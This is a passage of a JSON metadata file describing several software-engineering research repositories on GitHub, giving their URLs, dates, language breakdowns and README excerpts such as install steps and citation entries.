                    "type": "Programming_language",
                    "size": 78731
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 43146
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 39280
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 32341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 28399
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 24060
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 17613
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scheme",
                    "name": "Scheme",
                    "type": "Programming_language",
                    "size": 14512
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 13167
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Forth",
                    "name": "Forth",
                    "type": "Programming_language",
                    "size": 7445
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Julia",
                    "name": "Julia",
                    "type": "Programming_language",
                    "size": 6912
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Pawn",
                    "name": "Pawn",
                    "type": "Programming_language",
                    "size": 385
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Pascal",
                    "name": "Pascal",
                    "type": "Programming_language",
                    "size": 138
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "686": {
        "filename": "moji1_tp_rl_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/moji1/tp_rl",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-07-13T23:20:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-27T19:39:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 135975
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "687": {
        "filename": "KTH_checkstylerr_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/checkstylerr",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-06-03T13:10:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-14T09:05:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 354047
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 29511
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "688": {
        "filename": "evidencebp_analysis_utils_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/evidencebp/analysis_utils",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Supplementary Materials of the [\"Corrective commit probability: a measure of the effort invested in bug fixing\"](https://www.cs.huji.ac.il/~feit/papers/CCP21SQJ.pdf) paper by Idan Amit and [Dror G. Feitelson](https://www.cs.huji.ac.il/~feit/).\n\nPlease cite as\n``` \n@Article{Amit2021CCP,\nauthor={Amit, Idan\nand Feitelson, Dror G.},\ntitle={Corrective commit probability: a measure of the effort invested in bug fixing},\njournal={Software Quality Journal},\nyear={2021},\nmonth={Aug},\nday={05},\nabstract={The effort invested in software development should ideally be devoted to the implementation of new features. But some of the effort is invariably also invested in corrective maintenance, that is in fixing bugs. Not much is known about what fraction of software development work is devoted to bug fixing, and what factors affect this fraction. We suggest the Corrective Commit Probability (CCP), which measures the probability that a commit reflects corrective maintenance, as an estimate of the relative effort invested in fixing bugs. We identify corrective commits by applying a linguistic model to the commit messages, achieving an accuracy of 93{\\%}, higher than any previously reported model. We compute the CCP of all large active GitHub projects (7,557 projects with 200+ commits in 2019). This leads to the creation of an investment scale, suggesting that the bottom 10{\\%} of projects spend less than 6{\\%} of their total effort on bug fixing, while the top 10{\\%} of projects spend at least 39{\\%} of their effort on bug fixing --- more than 6 times more. Being a process metric, CCP is conditionally independent of source code metrics, enabling their evaluation and investigation. Analysis of project attributes shows that lower CCP (that is, lower relative investment in bug fixing) is associated with smaller files, lower coupling, use of languages like JavaScript and C{\\#} as opposed to PHP and C++, fewer code smells, lower project age, better perceived quality, fewer developers, lower developer churn, better onboarding, and better productivity.},\nissn={1573-1367},\ndoi={10.1007/s11219-021-09564-z},\nurl={https://doi.org/10.1007/s11219-021-09564-z},\npages={1--45},\npublisher={Springer}\n\n}\n\n```\n\nIt was later extended as part of\n\n[\"Follow Your Nose -- Which Code Smells are Worth Chasing?\"](https://arxiv.org/pdf/2103.01861.pdf) paper by Idan Amit, Nili Ben Ezra, and [Dror G. Feitelson](https://www.cs.huji.ac.il/~feit/).\n\nPlease cite as\n``` \n@misc{amit2021follow,\n      title={Follow Your Nose -- Which Code Smells are Worth Chasing?}, \n      author={Idan Amit and Nili Ben Ezra and Dror G. Feitelson},\n      year={2021},\n      eprint={2103.01861},\n      archivePrefix={arXiv},\n      primaryClass={cs.SE}\n}\n```\n\nThe repository itself should be cited as\n```\n@article{Amit2021Analysis\n, title={Analysis utilities}, \nDOI={10.5281/zenodo.5179861},\npublisher={Zenodo}\n, author={Idan Amit}\n, year={2021}\n, month={Aug}}\n\n```\n\nSee here the [linguistic commit classification](https://github.com/evidencebp/commit-classification)\n\nSee here the [corrective commit probability code](https://github.com/evidencebp/corrective-commit-probability)\n",
                    "type": "Text_excerpt",
                    "original_header": "Corrective commit probability: a measure of the effort invested in bug fixing"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/evidencebp/analysis_utils/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Live version is updating at https://github.com/evidencebp/analysis_utils/ \nAdding the setup, to allow pipi install, changed the repository structure.\nTo run the code of the related paper, use version up to commit e4f9ba0 \n",
                    "original_header": "Versions"
                },
                "confidence": 0.999547453620415,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evidencebp/analysis_utils/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-10T07:56:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-31T03:47:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 248429
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "689": {
        "filename": "ise-uiuc_DeepREL_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ise-uiuc/DeepREL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Run the following commands to load the database.\n\n```shell\nmongorestore -h 127.0.0.1:27017 --db tf dump/tf/\nmongorestore -h 127.0.0.1:27017 --db torch dump/torch/\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "2. Setting Up with Dataset",
                    "parent_header": [
                        "DeepREL",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ise-uiuc/DeepREL/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We provide a list of confirmed bug reports on [PyTorch](https://github.com/ise-uiuc/DeepREL/blob/main/PyTorch%20Issues.csv) and [TensorFlow](https://github.com/ise-uiuc/DeepREL/blob/main/TF%20issues.csv).\nWe also provide a Colab notebook to reproduce all 23 high-priority bugs for PyTorch  [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/ise-uiuc/DeepREL/blob/main/PyTorch_High_Priority_Issue_Reproduction.ipynb).\n \n",
                    "original_header": "Reproduce Bugs"
                },
                "confidence": 0.9310787216534303,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/DeepREL/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-21T14:10:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-17T02:00:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 230795
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 34798
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "690": {
        "filename": "hrishikeshrt_sangrahaka_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hrishikeshrt/sangrahaka",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation Instructions\n\nSa\u1e45gr\u0101haka is presented as a full-stack application that you can install on your\nown server. Installing it is fairly straightforward if you have the necessary\ncomponents.\n\n## Requirements\n\nSa\u1e45gr\u0101haka makes use of cross-platform technologies, and in theory should\nrun on all operating systems. It has been tested and is known to work on Ubuntu\n18.04 and Windows.\n\n### Primary Requirements\n\n* [Python3](https://www.python.org/downloads/): First and foremost, being powered by [Flask](https://flask.palletsprojects.com/en/2.2.x/), Sa\u1e45gr\u0101haka requires Python 3.\n  - Tested on Python 3.8.\n  - You may want to use [Anaconda](https://docs.anaconda.com/free/anaconda/install/).\n* Several features of Sa\u1e45gr\u0101haka are made possible through use of numerous Python packages available on the [Python Package Index (PyPI)](https://pypi.org/).\n  - Install them using `pip install -r requirements.txt`\n\n### Secondary Requirements\n\n*  [Neo4j](https://neo4j.com/download-center/#community) is a graph database management system (Think MySQL but for graphs!). Sa\u1e45gr\u0101haka uses Neo4j as its graph database to store and query knowledge graphs.\n  - Check the installation instructions for your platform.\n  - **Note**: Annotation process does not require Neo4j. Therefore, if you want to quickly get started with annotation without worrying about knowledge graphs, you can skip installing Neo4j.\n  - **Caution**: The interfaces under `Graph` tab will not function if a graph database is not connected.\n\n## Core Setup\n\n### Start Web (Flask) Server\n\n* Configure the application.\n  - Copy `settings.sample.py` to `settings.py`\n  - Open `settings.py` in a text editor and make appropriate changes.\n* Run application server.\n  - Open a terminal.\n  - Run `python3 server.py`\n  - **Note**: If you want to run it on a production environment, it is recommended to use a Web Server Gateway Interface (WSGI) such as [Gunicorn](https://gunicorn.org/)\n* Access the frontend to start using\n  - Copy the URL displayed on the terminal and load it in the browser of your choice.\n\nYour Sa\u1e45gr\u0101haka instance is now running!\n\n## Annotation Setup\n\n### Setup Annotation Task\n\n* Login using the administrator username and password set by you in `settings.py`\n* Go to `Admin` tab.\n* Upload Corpus\n  - Create a corpus entry by providing a name and an optional description.\n  - Prepare chapter files. (Check [examples](examples/) directory for the format of chapter files.)\n  - Upload chapter files.\n* Create Ontology\n  - Prepare a list of node types relevant to your corpus.\n  - Prepare a list of relationships that you want to capture among these node types.\n  - Upload the ontology in one of the two ways:\n    - Use GUI to `Add` relations one by one.\n    - Use `CSV` or `JSON` files to upload `Ontology` in bulk. (Check to [data/tables](data/tables) for file format and sample data.)\n\nYour Sa\u1e45gr\u0101haka instance is now ready for annotation!\n\n### Start Annotation\n\n* Ask your annotators to create accounts on your system.\n* Go to `Admin` tab to add `Annotator` role to the desired users.\n\n## Querying Setup\n\n### Build Knowledge Graph\n\nThe knowledge graph needs to be constructed using the collected annotations.\nThe `PropertyGraph()` class provided in [`utils/property_graph.py`](utils/property_graph.py) can be used for this purpose.\n\n**Disclaimer**: This step requires a certain level of familiarity with Python,\nproperty graph data model and computational aspects.\n\n**Note**: [`examples`](examples/) directory contains sample files for building the knowledge graph.\n\n### Prepare Query Templates\n\nQuery templates should be prepared at `data/query.json`. The format of query templates as well as sample\nfiles highlighting the query template preparation are available in [`examples`](examples/).\n\n**Disclaimer**: Creating query templates requires a certain level of familiarity\nwith [Cypher](https://neo4j.com/docs/getting-started/cypher-intro/) query\nlanguage and computational aspects.\n\n### Start Graph Database (Neo4j) Server *(optional)*\n\nIf you have installed Neo4j and want to use graph related features, you should\nstart a graph database server. It need not be on the same machine as the web\nserver, but it needs to be accessible via network to the machine hosting your\nweb server.\n\n* Start Neo4j graph server\n  - Open a terminal.\n  - Navigate to the `Neo4j` installation directory. (`cd <your-neo4j-installation-path>`)\n  - Run `./bin/neo4j console`\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/sangrahaka/main/INSTALL.md"
            },
            {
                "result": {
                    "value": "Sa\u1e45gr\u0101haka is presented as a full-stack application that you can install on your own server.\n\nThe detailed installation instructions are available at [INSTALL.md](INSTALL.md).\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Sa\u1e45gr\u0101haka"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/sangrahaka/main/README.md"
            },
            {
                "result": {
                    "value": "* Clone (or Download) this repository.\n* `pip install -r requirements.txt`\n* Copy `settings.sample.py` to `settings.py` and make appropriate changes.\n* Run application server using `python3 server.py`\n* Load the URL displayed on the terminal in the browser of your choice.\n* Login using the administrator username and password set by you in `settings.py`\n* Go to `Admin` tab to create a corpus and upload chapter files.\n* Create `Ontology` in one of the two ways.\n  - Use GUI to `Add` single relations.\n  - Use `CSV` or `JSON` files to upload `Ontology` in bulk. (Check to [data/tables](data/tables) for file format and sample data)\n\nYour Sangrahaka instance is now ready for annotation!\n\n* Ask your annotators to create accounts on your system.\n* Go to `Admin` tab to add `Annotator` role to the desired users.\n",
                    "type": "Text_excerpt",
                    "original_header": "Basic Setup",
                    "parent_header": [
                        "Sa\u1e45gr\u0101haka",
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/sangrahaka/main/README.md"
            },
            {
                "result": {
                    "value": "*  Install [Neo4j](https://neo4j.com/download-center/#community) (Required for querying)\n  - Navigate to the `Neo4j` installation directory\n  - Start the graph server: `./bin/neo4j console`\n* Construct the knowledge graph.\n* Load the knowledge graph into Neo4j.\n* Prepare the query templates file and place it in the `data/` folder.\n* Restart web server.\n\n**Disclaimer**: Steps such as preparing corpus files, query templates building knowledge graph requires\na certain level of familiarity with programming and the computational aspects.\n\n**Note**: `examples` directory contains sample files for corpus creation, query template and graph building.\n",
                    "type": "Text_excerpt",
                    "original_header": "Graph Setup",
                    "parent_header": [
                        "Sa\u1e45gr\u0101haka",
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/sangrahaka/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\n.\n\u251c\u2500\u2500 requirements.txt\n\u251c\u2500\u2500 settings.sample.py\n\u251c\u2500\u2500 models_admin.py\n\u251c\u2500\u2500 models_sqla.py\n\u251c\u2500\u2500 server.py -> server_sqla.py\n\u251c\u2500\u2500 server_sqla.py\n\u251c\u2500\u2500 constants.py\n\u251c\u2500\u2500 data\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 query.json\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 tables\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 README.md\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 sample\n\u251c\u2500\u2500 db\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 main.db\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 README.md\n\u251c\u2500\u2500 templates [*.html]\n\u251c\u2500\u2500 utils\n\u2502   \u251c\u2500\u2500 configuration.py\n\u2502   \u251c\u2500\u2500 cypher_utils.py\n\u2502   \u251c\u2500\u2500 database.py\n\u2502   \u251c\u2500\u2500 graph.py\n\u2502   \u251c\u2500\u2500 plaintext.py\n\u2502   \u251c\u2500\u2500 property_graph.py\n\u2502   \u251c\u2500\u2500 query.py\n\u2502   \u2514\u2500\u2500 reverseproxied.py\n\u251c\u2500\u2500 static\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 audio [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bootstrap [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 css [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 custom\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 css\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 builder\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 builder.css\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 [...]\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 sticky-footer.css\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 admin\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 admin.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 browse\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 browse.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 builder\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 builder.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 corpus\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 annotation.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 curation.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 elements.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u251c\u2500\u2500 events.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 functions.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 query\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u251c\u2500\u2500 network.js\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u2514\u2500\u2500 query.js\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 fontawesome [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 images [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 js [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 plugins [...]\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 themes [...]\n\u251c\u2500\u2500 examples\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ayurveda [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 epics [...]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 README.md\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 requirements.txt\n\u251c\u2500\u2500 output [...]\n\u251c\u2500\u2500 explore_database.py\n\u251c\u2500\u2500 setup.cfg\n\u251c\u2500\u2500 INSTALL.md\n\u2514\u2500\u2500 README.md\n```\n \n",
                    "original_header": "Structure"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hrishikeshrt/sangrahaka/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-07T03:17:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T13:22:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 305828
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 200018
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 101206
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 20198
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "691": {
        "filename": "salab_ChangeBeadsThreader_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/salab/ChangeBeadsThreader",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. `$ git clone https://github.com/salab/ChangeBeadsThreader.git`\n1. `$ yarn`\n1. `$ yarn build`\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "ChangeBeadsThreader"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/salab/ChangeBeadsThreader/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-12-30T09:21:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-29T01:40:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 145749
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 4839
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 2213
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 1052
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 336
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "692": {
        "filename": "nli2code_jss-artifact_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nli2code/jss-artifact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Each directory contains a simple `README.md` file to help you install and execute the demo.\n \n",
                    "original_header": "src"
                },
                "confidence": 0.984363694183318,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nli2code/jss-artifact/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. `tool/mps`: a Jetbrains MPS plugin\n2. `http://nli2code.cn`: a web editor \n",
                    "original_header": "tool"
                },
                "confidence": 0.9719369324389628,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/nli2code/jss-artifact/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-22T16:15:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-03T11:57:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3006783
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 23438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "693": {
        "filename": "20200501_OwlEye_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/20200501/OwlEye",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We evaluate the usefulness of our model by applying our OwlEye in detecting the UI display issues in the real-world apps from Google Play and F-Droid. Among 2,200 apps, we find that 56 of them are with UI display issues. We issued bug reports to the development team and 25 are confirmed and fixed by developers.\n\n**APP Name** | **Version** | **Package Name** | **Category** | **APKSource** | **Download** | **Issueid** | **Status**\n :-: | :-: | :-: | :-: |  :-: | :-: | :-: | :-: \n[Open Food Facts][1] | 3.2.8 | openfoodfacts.github.scrachx.openfood_328 | Health | F-droid | 500K+ | #3051 | confirmed  \n[Transdroid][2] | 2.5.17 | org.transdroid.full_237 | Tool | F-droid | 100K+ | #542 | confirmed  \n[Linphone][3] | 4.2.3 | org.linphone_4230 | Communication  | F-droid | 500K+ | #965 | confirmed  \n[NewPipe Legacy][4] | 0.18.6 | org.schabi.newpipe_870 | Media | F-droid | 8K+ | #24 | fixed  \n[CEToolbox][5] | 1.3 | com.github.cetoolbox_5 | Medical | F-droid | 500+ | #4 | confirmed  \n[Yucata Envoy][6] | 0.5.3 | kaba.yucata.envoy_503 | Tool | F-droid | N/A | #3 | confirmed   \n[MTG Familiar][7] | 3.6.4 | com.gelakinetic.mtgfam_70 | Utilities | F-droid | 500K+ | #512 | fixed   \n[OpenTracks-OSM][8]  | 1.5.0 | de.storchp.opentracks.osmplugin_7 | Health | F-droid | 10+ | #26 | fixed   \n[LessPass][9] | 9.1.2 | com.lesspass.android_90102 | Productivity | F-droid | 5K+ | #519 | fixed   \n[ClassyShark3xodus][10] | 1.0-12 | com.oF2pks.classyshark3xodus_12 | Tool | F-droid | N/A | #3 | confirmed   \n[VlcFreemote][11] | 1.10 | com.nicolasbrailo.vlcfreemote_10 | Media | F-droid | N/A | #24 | confirmed   \n[Transistor][12] | 3.2.4 | org.y20k.transistor_71 | Music | F-droid | 10K+ | #254 | fixed   \n[Enhanced Controller for Onkyo and Pioneer][13] | 1.10 | com.mkulesh.onpc_23 | Music | F-droid | 10K+ | #138 | fixed  \n[DemocracyDroid][14] | 3.7.1 | com.workingagenda.democracydroid_43 | News | F-droid | 10K+ | #51 | confirmed \n[ApowerMirror][15] | 1.5.9.34 | ApowerMirror Mirror Control_v1.5.9.34_apkpure.com | Tool | Google | 5M+ | email | confirmed  \n[Degoo Cloud Storage][16] | 1.57.7 | Degoo Cloud Storage_v1.57.7.200316_apkpure.com | Tool | Google | 10M+ | email | fixed  \n[Deezer Music Player][17] | 6.1.22.49 | Deezer Music Player Songs Playlists Podcasts_v6.1.22.49_apkpure.com | Music | Google | 500K+ | email | fixed  \n[MediaFire][18] | 4.2.2 | MediaFire_v4.2.2_apkpure.com | Productivity | Google | 5M+ | email | confirmed  \n[Secure VPN][19] | 2.2.5 | Secure VPN \u2013 A high speed ultra secure VPN_v2.2.5_apkpure.com | Tool | Google | 10M+ | email | confirmed  \n[Nox security][20] | 1.7.6 | Nox Security Antivirus Master Clean Virus Free_v1.7.3_apkpure.com | Tool | Google | 10M+ | email | fixed  \n[Music Player][21] | 3.8.8 | Music Player Audio Player_v3.8.8_apkpure.com | Music | Google | 50M+ | email | confirmed  \n[Proxynel][22] | 2.2.9 | Proxynel Unblock Websites Free VPN Proxy Browser_v2.29_apkpure.com | Tool | Google | 10M+ | email | confirmed  \n[Postegro][23] | 1.23 | Postegro Any Profile Viewer_v1.23_apkpure.com | Communication  | Google | 500K+ | email | fixed   \n[Perfect Piano][24] | 7.5.1 | Perfect Piano_v7.5.1_apkpure.com | Music | Google | 50M+ | email | confirmed\n[Paytm][25] | 